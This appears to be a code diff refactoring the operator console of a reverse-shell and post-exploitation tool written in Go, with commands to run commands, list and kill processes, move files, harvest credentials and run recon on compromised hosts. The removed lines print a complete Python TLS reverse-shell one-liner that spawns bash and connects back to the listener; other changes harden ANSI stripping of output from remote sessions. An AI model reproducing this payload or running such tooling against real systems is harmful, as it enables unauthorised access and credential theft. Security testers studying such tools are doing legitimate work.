@@ -28,6 +28,68 @@ func fmtAge(d time.Duration) string {
 	return fmt.Sprintf("%dh", int(d.Hours()))
 }
 
+// ptyExecContext holds the resources needed for executing a command on a
+// backgrounded PTY session. Returned by acquirePTY.
+type ptyExecContext struct {
+	upgrader        *PTYUpgrader
+	conn            net.Conn
+	drainWasRunning bool
+}
+
+// checkBackgrounded checks that sess is backgrounded (not interactive, not
+// terminated). Returns true if validation passes. Prints an error and returns
+// false otherwise. The caller must hold sess.mu.
+func checkBackgrounded(sess *Session) bool {
+	if sess.State == SessionStateInteractive {
+		fmt.Printf("[!] Session %d is currently active — background it first.\n", sess.ID)
+		return false
+	}
+	if sess.State == SessionStateTerminated {
+		fmt.Printf("[!] Session %d has been terminated.\n", sess.ID)
+		return false
+	}
+	return true
+}
+
+// acquirePTY validates that sess is a backgrounded PTY session (not interactive,
+// not terminated, upgrader initialized) and returns the resources needed to
+// execute a command. Returns nil and prints an error if validation fails.
+// The caller must NOT hold sess.mu.
+func acquirePTY(sess *Session) *ptyExecContext {
+	sess.mu.Lock()
+	defer sess.mu.Unlock()
+
+	if !checkBackgrounded(sess) {
+		return nil
+	}
+	if sess.Upgrader == nil {
+		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", sess.ID)
+		return nil
+	}
+	conn := sess.ActiveConn
+	if conn == nil {
+		conn = sess.Conn
+	}
+	return &ptyExecContext{
+		upgrader:        sess.Upgrader,
+		conn:            conn,
+		drainWasRunning: sess.drainStop != nil,
+	}
+}
+
+// withDrainStopped stops the drain goroutine, runs fn, and restarts the drain
+// if it was running before. Must be called after acquirePTY.
+func (c *Console) withDrainStopped(sess *Session, ctx *ptyExecContext, fn func()) {
+	ctx.upgrader.clearDeadline()
+	c.stopDrain(sess)
+	defer func() {
+		if ctx.drainWasRunning {
+			c.startDrain(sess, ctx.conn)
+		}
+	}()
+	fn()
+}
+
 func (c *Console) cmdSessions(args []string) {
 	// Parse flags from args
 	// Usage: sessions [--filter os=<val>|hostname=<val>|ip=<val>|cve] [--group os|container|status|match_count] [--sort id|-id|uptime|-uptime|match_count]
@@ -189,82 +251,90 @@ func (c *Console) sortSessions(sessions []*Session, sortBy string) {
 	}
 }
 
-// displaySessions shows sessions in the standard format
-func (c *Console) displaySessions(sessions []*Session) {
+// printSessionTableHeader prints the column header and separator for session tables.
+func printSessionTableHeader() {
 	hdr := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
 		"ID", "Remote", "User", "OS", "CVEs", "TLS", "Age")
 	sep := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
 		"──", "────────────────────", "────────────", "────────────────────────", "────", "───", "───")
 	fmt.Println(ansiBold + hdr + ansiReset)
 	fmt.Println(ansiDim + sep + ansiReset)
+}
 
-	for _, s := range sessions {
-		s.mu.Lock()
-		age := fmtAge(time.Since(s.StartTime))
-		tlsStr := "✗"
-		if s.TLS {
-			tlsStr = ansiGreen + "✓" + ansiReset
-		}
+// printSessionRow prints a single session as a formatted table row.
+// The caller must NOT hold s.mu.
+func printSessionRow(s *Session) {
+	s.mu.Lock()
+	age := fmtAge(time.Since(s.StartTime))
+	tlsStr := "✗"
+	if s.TLS {
+		tlsStr = ansiGreen + "✓" + ansiReset
+	}
 
-		var user, osStr, cveStr string
-		suffix := ""
+	var user, osStr, cveStr string
+	suffix := ""
 
-		if s.IsAgent && s.AgentMeta != nil {
-			user = s.AgentMeta.User
-			osStr = s.AgentMeta.OS + "/" + s.AgentMeta.Arch
-			cveStr = "-"
-			suffix = ansiGreen + "  [agent]" + ansiReset
-		} else if s.Findings == nil {
-			user = "..."
-			osStr = "..."
-			cveStr = "..."
-			suffix = ansiDim + "  ← recon running" + ansiReset
+	if s.IsAgent && s.AgentMeta != nil {
+		user = s.AgentMeta.User
+		osStr = s.AgentMeta.OS + "/" + s.AgentMeta.Arch
+		cveStr = "-"
+		suffix = ansiGreen + "  [agent]" + ansiReset
+	} else if s.Findings == nil {
+		user = "..."
+		osStr = "..."
+		cveStr = "..."
+		suffix = ansiDim + "  ← recon running" + ansiReset
+	} else {
+		if s.Findings.User != nil {
+			user = safeFindings(*s.Findings.User)
 		} else {
-			if s.Findings.User != nil {
-				user = safeFindings(*s.Findings.User)
-			} else {
-				user = "unknown"
-			}
-			if s.Findings.OS != nil {
-				osStr = safeFindings(*s.Findings.OS)
-			} else {
-				osStr = "unknown"
-			}
-			cveStr = strconv.Itoa(len(s.Findings.CveCandidates))
+			user = "unknown"
 		}
-		if s.IsRoot {
-			user = user + "#"
+		if s.Findings.OS != nil {
+			osStr = safeFindings(*s.Findings.OS)
+		} else {
+			osStr = "unknown"
 		}
+		cveStr = strconv.Itoa(len(s.Findings.CveCandidates))
+	}
+	if s.IsRoot {
+		user = user + "#"
+	}
 
-		// Truncate long fields for display.
-		user = truncate(user, 12)
-		osStr = truncate(osStr, 24)
+	user = truncate(user, 12)
+	osStr = truncate(osStr, 24)
 
-		// Show label when set, otherwise strip port from remote addr.
-		remote := s.RemoteAddr
-		if h, _, err := net.SplitHostPort(remote); err == nil {
-			remote = h
-		}
-		if s.Label != "" {
-			remote = s.Label
-		}
-		remote = truncate(remote, 20)
+	remote := s.RemoteAddr
+	if h, _, err := net.SplitHostPort(remote); err == nil {
+		remote = h
+	}
+	if s.Label != "" {
+		remote = s.Label
+	}
+	remote = truncate(remote, 20)
 
-		isRoot := s.IsRoot
-		noFindings := s.Findings == nil
-		s.mu.Unlock()
+	isRoot := s.IsRoot
+	noFindings := s.Findings == nil
+	s.mu.Unlock()
 
-		row := fmt.Sprintf("  %-4d  %-20s  %-12s  %-24s  %-4s  %-3s  %s%s",
-			s.ID, remote, user, osStr, cveStr, tlsStr, age, suffix)
+	row := fmt.Sprintf("  %-4d  %-20s  %-12s  %-24s  %-4s  %-3s  %s%s",
+		s.ID, remote, user, osStr, cveStr, tlsStr, age, suffix)
 
-		switch {
-		case isRoot:
-			fmt.Println(ansiBoldGreen + row + ansiReset)
-		case noFindings:
-			fmt.Println(ansiDim + row + ansiReset)
-		default:
-			fmt.Println(row)
-		}
+	switch {
+	case isRoot:
+		fmt.Println(ansiBoldGreen + row + ansiReset)
+	case noFindings:
+		fmt.Println(ansiDim + row + ansiReset)
+	default:
+		fmt.Println(row)
+	}
+}
+
+// displaySessions shows sessions in the standard format
+func (c *Console) displaySessions(sessions []*Session) {
+	printSessionTableHeader()
+	for _, s := range sessions {
+		printSessionRow(s)
 	}
 }
 
@@ -312,71 +382,9 @@ func (c *Console) displayGroupedSessions(sessions []*Session, groupBy string) {
 
 	for group, sessList := range groups {
 		fmt.Printf("\n%s[%s]%s\n", ansiBoldCyan, group, ansiReset)
-		hdr := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
-			"ID", "Remote", "User", "OS", "CVEs", "TLS", "Age")
-		sep := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
-			"──", "────────────────────", "────────────", "────────────────────────", "────", "───", "───")
-		fmt.Println(ansiBold + hdr + ansiReset)
-		fmt.Println(ansiDim + sep + ansiReset)
+		printSessionTableHeader()
 		for _, s := range sessList {
-			s.mu.Lock()
-			age := fmtAge(time.Since(s.StartTime))
-			tlsStr := "✗"
-			if s.TLS {
-				tlsStr = ansiGreen + "✓" + ansiReset
-			}
-
-			var user, osStr, cveStr string
-			suffix := ""
-
-			if s.Findings == nil {
-				user = "..."
-				osStr = "..."
-				cveStr = "..."
-				suffix = ansiDim + "  ← recon running" + ansiReset
-			} else {
-				if s.Findings.User != nil {
-					user = safeFindings(*s.Findings.User)
-				} else {
-					user = "unknown"
-				}
-				if s.Findings.OS != nil {
-					osStr = safeFindings(*s.Findings.OS)
-				} else {
-					osStr = "unknown"
-				}
-				cveStr = strconv.Itoa(len(s.Findings.CveCandidates))
-			}
-			if s.IsRoot {
-				user = user + "#"
-			}
-
-			user = truncate(user, 12)
-			osStr = truncate(osStr, 24)
-
-			remote := s.RemoteAddr
-			if h, _, err := net.SplitHostPort(remote); err == nil {
-				remote = h
-			}
-			if s.Label != "" {
-				remote = s.Label
-			}
-			remote = truncate(remote, 20)
-
-			isRoot := s.IsRoot
-			noFindings := s.Findings == nil
-			s.mu.Unlock()
-
-			row := fmt.Sprintf("  %-4d  %-20s  %-12s  %-24s  %-4s  %-3s  %s%s",
-				s.ID, remote, user, osStr, cveStr, tlsStr, age, suffix)
-			switch {
-			case isRoot:
-				fmt.Println(ansiBoldGreen + row + ansiReset)
-			case noFindings:
-				fmt.Println(ansiDim + row + ansiReset)
-			default:
-				fmt.Println(row)
-			}
+			printSessionRow(s)
 		}
 	}
 }
@@ -574,24 +582,13 @@ func (c *Console) cmdExec(args []string) {
 		return
 	}
 
-	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
-		return
-	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
-		return
-	}
+	cmdStr := strings.Join(args[1:], " ")
 
-	// Build the command string (everything after the session ID).
-	var cmdParts []string
-	for i := 1; i < len(args); i++ {
-		cmdParts = append(cmdParts, args[i])
+	sess.mu.Lock()
+	if !checkBackgrounded(sess) {
+		sess.mu.Unlock()
+		return
 	}
-	cmdStr := strings.Join(cmdParts, " ")
 
 	// Agent sessions: dispatch via structured task protocol.
 	if sess.IsAgent {
@@ -619,7 +616,7 @@ func (c *Console) cmdExec(args []string) {
 
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
+		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", sess.ID)
 		return
 	}
 	u := sess.Upgrader
@@ -630,7 +627,6 @@ func (c *Console) cmdExec(args []string) {
 	}
 	sess.mu.Unlock()
 
-	// Stop the drain goroutine before reading so it cannot steal response bytes.
 	u.clearDeadline()
 	c.stopDrain(sess)
 	defer func() {
@@ -720,6 +716,70 @@ func stripDangerousAnsi(s string) string {
 	var result strings.Builder
 	var i int
 	for i < len(s) {
+		// Preserve UTF-8 multibyte sequences: lead bytes 0xC0-0xFF introduce
+		// 2-4 byte sequences whose continuation bytes (0x80-0xBF) overlap C1.
+		if s[i] >= 0xc0 {
+			// Determine the length of the UTF-8 sequence from the lead byte.
+			seqLen := 1
+			switch {
+			case s[i] < 0xe0:
+				seqLen = 2
+			case s[i] < 0xf0:
+				seqLen = 3
+			default:
+				seqLen = 4
+			}
+			end := i + seqLen
+			if end > len(s) {
+				end = len(s)
+			}
+			result.WriteString(s[i:end])
+			i = end
+			continue
+		}
+		// Strip C1 control codes (0x80-0x9F) — 8-bit equivalents of dangerous ESC sequences.
+		// These have no legitimate use in UTF-8 terminal output.
+		// Consume the body they introduce, matching the 2-byte ESC equivalents.
+		if s[i] >= 0x80 && s[i] <= 0x9f {
+			switch s[i] {
+			case 0x9b: // CSI — skip params + final byte
+				i++
+				for i < len(s) && ((s[i] >= '0' && s[i] <= '9') || s[i] == ';' || s[i] == ' ' || s[i] == '?') {
+					i++
+				}
+				if i < len(s) {
+					i++ // skip final byte
+				}
+			case 0x9d: // OSC — skip to BEL or ST
+				i++
+				for i < len(s) {
+					if s[i] == 0x07 {
+						i++
+						break
+					}
+					if s[i] == 0x1b && i+1 < len(s) && s[i+1] == '\\' {
+						i += 2
+						break
+					}
+					i++
+				}
+			case 0x90, 0x9e, 0x9f: // DCS, PM, APC — skip to ST
+				i++
+				for i < len(s)-1 {
+					if s[i] == 0x1b && s[i+1] == '\\' {
+						i += 2
+						break
+					}
+					i++
+				}
+				if i == len(s)-1 {
+					i = len(s)
+				}
+			default:
+				i++ // other C1 codes — just strip the byte
+			}
+			continue
+		}
 		if s[i] == '\x1b' && i+1 < len(s) {
 			if s[i+1] == '[' {
 				// CSI sequence - detect type
@@ -771,9 +831,22 @@ func stripDangerousAnsi(s string) string {
 				}
 				continue
 			}
-			if s[i+1] == '_' || s[i+1] == '^' || s[i+1] == 'X' {
-				// APC, PM, SOS - skip entirely
+			if s[i+1] == '_' || s[i+1] == '^' || s[i+1] == 'X' || s[i+1] == 'P' {
+				// APC, PM, SOS, DCS — skip entire sequence body up to ST (\x1b\) or end of string
 				i += 2
+				foundST := false
+				for i < len(s)-1 {
+					if s[i] == 0x1b && s[i+1] == '\\' {
+						i += 2
+						foundST = true
+						break
+					}
+					i++
+				}
+				// If we reached end of string without finding ST, skip remaining byte
+				if !foundST && i < len(s) {
+					i = len(s)
+				}
 				continue
 			}
 		}
@@ -874,58 +947,29 @@ func (c *Console) cmdPs(args []string) {
 		return
 	}
 
-	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
+	ctx := acquirePTY(sess)
+	if ctx == nil {
 		return
 	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
-		return
-	}
-	if sess.Upgrader == nil {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
-		return
-	}
-	u := sess.Upgrader
-	drainWasRunning := sess.drainStop != nil
-	conn := sess.ActiveConn
-	if conn == nil {
-		conn = sess.Conn
-	}
-	sess.mu.Unlock()
 
-	u.clearDeadline()
-	c.stopDrain(sess)
-	defer func() {
-		if drainWasRunning {
-			c.startDrain(sess, conn)
+	c.withDrainStopped(sess, ctx, func() {
+		cmdStr := "ps -eo pid,user,%cpu,%mem,comm --no-headers 2>/dev/null || ps aux 2>/dev/null\n"
+		if err := ctx.upgrader.write(cmdStr); err != nil {
+			fmt.Printf("[!] Failed to send command: %v\n", err)
+			return
 		}
-	}()
 
-	// Send ps command - use -eo for full format with PID, user, %CPU, %MEM, command
-	cmdStr := "ps -eo pid,user,%cpu,%mem,comm --no-headers 2>/dev/null || ps aux 2>/dev/null\n"
-	if err := u.write(cmdStr); err != nil {
-		fmt.Printf("[!] Failed to send command: %v\n", err)
-		return
-	}
+		output, err := ctx.upgrader.readUntilPrompt(10 * time.Second)
+		if err != nil {
+			fmt.Printf("[!] Failed to read process list: %v\n", err)
+			return
+		}
 
-	// Read until prompt
-	output, err := u.readUntilPrompt(10 * time.Second)
-	if err != nil {
-		fmt.Printf("[!] Failed to read process list: %v\n", err)
-		return
-	}
-
-	// Strip prompts, then strip dangerous ANSI — process names are remote-controlled.
-	clean := stripDangerousAnsi(u.StripPrompts(output))
-
-	if clean != "" {
-		fmt.Println(clean)
-	}
+		clean := stripDangerousAnsi(ctx.upgrader.StripPrompts(output))
+		if clean != "" {
+			fmt.Println(clean)
+		}
+	})
 }
 
 // cmdKillproc kills a specific process on a backgrounded session.
@@ -953,57 +997,29 @@ func (c *Console) cmdKillproc(args []string) {
 		return
 	}
 
-	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
+	ctx := acquirePTY(sess)
+	if ctx == nil {
 		return
 	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
-		return
-	}
-	if sess.Upgrader == nil {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
-		return
-	}
-	u := sess.Upgrader
-	drainWasRunning := sess.drainStop != nil
-	conn := sess.ActiveConn
-	if conn == nil {
-		conn = sess.Conn
-	}
-	sess.mu.Unlock()
 
-	u.clearDeadline()
-	c.stopDrain(sess)
-	defer func() {
-		if drainWasRunning {
-			c.startDrain(sess, conn)
+	c.withDrainStopped(sess, ctx, func() {
+		cmdStr := fmt.Sprintf("kill -%s %s 2>&1\n", signal, pidStr)
+		if err := ctx.upgrader.write(cmdStr); err != nil {
+			fmt.Printf("[!] Failed to send command: %v\n", err)
+			return
 		}
-	}()
 
-	// Send kill command
-	cmdStr := fmt.Sprintf("kill -%s %s 2>&1\n", signal, pidStr)
-	if err := u.write(cmdStr); err != nil {
-		fmt.Printf("[!] Failed to send command: %v\n", err)
-		return
-	}
+		output, err := ctx.upgrader.readUntilPrompt(5 * time.Second)
+		if err != nil {
+			fmt.Printf("[!] Failed to read command output: %v\n", err)
+			return
+		}
 
-	// Read until prompt
-	output, err := u.readUntilPrompt(5 * time.Second)
-	if err != nil {
-		fmt.Printf("[!] Failed to read command output: %v\n", err)
-		return
-	}
-
-	clean := stripDangerousAnsi(u.StripPrompts(output))
-
-	if clean != "" {
-		fmt.Println(clean)
-	}
+		clean := stripDangerousAnsi(ctx.upgrader.StripPrompts(output))
+		if clean != "" {
+			fmt.Println(clean)
+		}
+	})
 }
 
 // cmdDownload downloads a file from the remote session to the local machine.
@@ -1074,14 +1090,8 @@ func (c *Console) cmdDownload(args []string) {
 	}
 
 	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
+	if !checkBackgrounded(sess) {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
-		return
-	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
 
@@ -1104,7 +1114,7 @@ func (c *Console) cmdDownload(args []string) {
 
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
+		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", sess.ID)
 		return
 	}
 	u := sess.Upgrader
@@ -1263,14 +1273,8 @@ func (c *Console) cmdUpload(args []string) {
 	}
 
 	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
+	if !checkBackgrounded(sess) {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
-		return
-	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
 
@@ -1288,7 +1292,7 @@ func (c *Console) cmdUpload(args []string) {
 
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
+		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", sess.ID)
 		return
 	}
 	u := sess.Upgrader
@@ -1690,29 +1694,21 @@ func (c *Console) cmdCreds(args []string) {
 	}
 
 	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
+	if !checkBackgrounded(sess) {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
 		return
 	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
-		return
-	}
-	isAgent := sess.IsAgent
-	sess.mu.Unlock()
 
 	// Agent sessions: use TaskCreds (pure Go file reads, no PTY required).
-	if isAgent {
+	if sess.IsAgent {
+		sess.mu.Unlock()
 		c.cmdCredsAgent(sess, outPath)
 		return
 	}
 
-	sess.mu.Lock()
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
+		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", sess.ID)
 		return
 	}
 	u := sess.Upgrader
@@ -1780,7 +1776,7 @@ func (c *Console) cmdCreds(args []string) {
 		clean = strings.TrimRight(strings.Join(lines, "\n"), "\r\n\t ")
 		if clean != "" {
 			fmt.Println(stripDangerousAnsi(clean))
-			fmt.Fprintln(&buf, clean) // export to buffer unstripped (file output is safe)
+			fmt.Fprintln(&buf, stripDangerousAnsi(clean))
 		}
 	}
 	fmt.Println()
@@ -1822,14 +1818,8 @@ func (c *Console) cmdRecon(args []string) {
 	}
 
 	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
+	if !checkBackgrounded(sess) {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
-		return
-	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
 
@@ -1842,7 +1832,7 @@ func (c *Console) cmdRecon(args []string) {
 
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
+		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", sess.ID)
 		return
 	}
 	u := sess.Upgrader
@@ -2251,10 +2241,7 @@ func (c *Console) cmdTLSUpgrade(args []string) {
 		listenPort = p
 	}
 
-	reconnectCmd := fmt.Sprintf(
-		`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
-		upgrader.pythonBin, effectiveListenIP, listenPort, c.opts.fingerprintHex,
-	)
+	reconnectCmd := buildTLSReconnectCmd(upgrader.pythonBin, effectiveListenIP, listenPort, c.opts.fingerprintHex)
 
 	// Register the routing claim BEFORE sending the command so acceptLoop
 	// never races to accept the reconnect as a new session.
@@ -2417,10 +2404,7 @@ func (c *Console) cmdReset(args []string) {
 	if upgrader.UsedPython() && c.opts.tlsEnabled {
 		// Python TLS relay — fingerprint-pinned, identical to handleSession and
 		// cmdTLSUpgrade so all three TLS paths have the same MITM protection.
-		reconnectCmd = fmt.Sprintf(
-			`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
-			upgrader.PythonBin(), effectiveListenIP, listenPort, c.opts.fingerprintHex,
-		)
+		reconnectCmd = buildTLSReconnectCmd(upgrader.PythonBin(), effectiveListenIP, listenPort, c.opts.fingerprintHex)
 	} else {
 		// Fallback: plain /dev/tcp or python socket
 		reconnectCmd = fmt.Sprintf(
